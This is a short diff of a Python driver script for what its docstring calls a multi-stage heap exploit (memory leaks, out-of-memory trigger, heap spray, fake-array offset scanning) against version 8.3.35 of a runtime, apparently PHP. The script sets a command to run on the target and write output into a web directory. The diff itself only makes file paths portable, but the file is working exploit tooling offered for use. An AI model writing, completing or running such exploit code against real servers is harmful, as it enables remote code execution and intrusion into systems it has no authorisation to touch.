@@ -2,14 +2,15 @@
 """8.3.35: exploit.py stage1+2 (leaks) + 9bie A2 cheap-OOM + 9bie B2 spray.
 Scans S offset (fake-array = ht field position) for 8.3.35's heap layout.
 """
+import os
 import sys, os, time, subprocess
-sys.path.insert(0, r"C:\Users\likat\p2s52704")
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 import exploit
 
 PORT = 18112
 CMD = "id>/www/p1"
-GH = r"C:\Users\likat\.qwen\tmp\p2s"
-TMP = r"C:\Users\likat\p2s52704\tmp_8335"
+GH = os.path.join(os.path.expanduser("~"), ".qwen", "tmp", "p2s")
+TMP = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tmp_8335")
 
 def run9(script, args, timeout=180):
     cmd = [sys.executable, os.path.join(GH, f"gh_pure_{script}")] + args
